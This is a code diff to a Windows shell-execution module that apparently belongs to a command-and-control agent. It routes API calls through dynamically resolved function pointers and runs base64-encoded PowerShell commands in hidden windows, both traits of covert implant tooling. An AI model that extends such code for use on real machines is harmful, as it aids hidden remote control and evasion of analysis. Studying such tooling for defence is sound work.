@@ -17,11 +17,9 @@
 
 #ifdef _WIN32
 
-#define WIN32_LEAN_AND_MEAN
-#include <windows.h>
+#include "../win32/win32_api.h"
 #include "shell_windows.h"
 #include "../logging/logging.h"
-#include "../win32/win32_api.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -106,6 +104,36 @@ static BOOL c2t_SetHandleInformation(HANDLE hObject, DWORD dwMask,
   if (g_c2t_win32.SetHandleInformation)
     return g_c2t_win32.SetHandleInformation(hObject, dwMask, dwFlags);
   return FALSE;
+}
+
+static HANDLE c2t_CreateFileA(
+    LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
+    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
+  c2t_win32_api_init();
+  if (g_c2t_win32.CreateFileA)
+    return g_c2t_win32.CreateFileA(
+        lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
+        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
+  return INVALID_HANDLE_VALUE;
+}
+
+static HANDLE c2t_GetStdHandle(DWORD nStdHandle) {
+  c2t_win32_api_init();
+  if (g_c2t_win32.GetStdHandle)
+    return g_c2t_win32.GetStdHandle(nStdHandle);
+  return INVALID_HANDLE_VALUE;
+}
+
+static int c2t_MultiByteToWideChar(UINT CodePage, DWORD dwFlags,
+                                   LPCCH lpMultiByteStr, int cbMultiByte,
+                                   LPWSTR lpWideCharStr, int cchWideChar) {
+  c2t_win32_api_init();
+  if (g_c2t_win32.MultiByteToWideChar)
+    return g_c2t_win32.MultiByteToWideChar(
+        CodePage, dwFlags, lpMultiByteStr, cbMultiByte, lpWideCharStr,
+        cchWideChar);
+  return 0;
 }
 
 static BOOL c2t_TerminateProcess(HANDLE hProcess, UINT uExitCode) {
@@ -286,12 +314,14 @@ int c2t_shell_windows_execute_ex(const c2t_shell_options_t *options,
 
   switch (options->shell_type) {
   case C2T_SHELL_POWERSHELL: {
-    int wlen = MultiByteToWideChar(CP_UTF8, 0, options->command, -1, NULL, 0);
+    int wlen = c2t_MultiByteToWideChar(CP_UTF8, 0, options->command, -1,
+                                       NULL, 0);
     char *b64 = NULL;
     if (wlen > 1) {
       wchar_t *wbuf = malloc((size_t)wlen * sizeof(wchar_t));
       if (wbuf) {
-        MultiByteToWideChar(CP_UTF8, 0, options->command, -1, wbuf, wlen);
+        c2t_MultiByteToWideChar(CP_UTF8, 0, options->command, -1, wbuf,
+                                wlen);
         b64 = b64_encode_bytes((const unsigned char *)wbuf, (size_t)(wlen - 1) * sizeof(wchar_t));
         free(wbuf);
       }
@@ -351,8 +381,9 @@ int c2t_shell_windows_execute_ex(const c2t_shell_options_t *options,
       c2t_SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);
     }
   } else {
-    hNullIn = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
-                          &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    hNullIn = c2t_CreateFileA("NUL", GENERIC_READ,
+                              FILE_SHARE_READ | FILE_SHARE_WRITE, &sa,
+                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   }
 
   STARTUPINFOA si;
@@ -360,7 +391,9 @@ int c2t_shell_windows_execute_ex(const c2t_shell_options_t *options,
   si.cb = sizeof(si);
   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
-  si.hStdInput = hStdIn ? hStdIn : (hNullIn ? hNullIn : GetStdHandle(STD_INPUT_HANDLE));
+  si.hStdInput = hStdIn ? hStdIn
+                        : (hNullIn ? hNullIn
+                                   : c2t_GetStdHandle(STD_INPUT_HANDLE));
   si.hStdOutput = hWritePipe;
   si.hStdError = hWritePipe;
 
